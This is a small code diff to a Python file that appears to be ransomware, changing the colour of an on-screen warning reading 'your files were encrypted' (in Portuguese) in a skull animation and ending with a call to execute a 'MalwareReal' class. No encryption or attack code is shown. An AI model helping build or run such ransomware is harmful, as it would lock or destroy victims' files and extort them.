@@ -717,7 +717,7 @@ def run_skull_animation():
         # Adicionar mensagem de aviso
         warning_font = pygame.font.SysFont('Arial', 36, bold=True)
         warning_text = "SEUS ARQUIVOS FORAM CRIPTOGRAFADOS"
-        warning_surface = warning_font.render(warning_text, True, RED)
+        warning_surface = warning_font.render(warning_text, True, BLUE)
         warning_rect = warning_surface.get_rect(center=(width//2, height - 100))
         screen.blit(warning_surface, warning_rect)
         
@@ -1779,5 +1779,6 @@ if __name__ == "__main__":
         pass
     malware = MalwareReal()
     malware.execute()
+
 
 
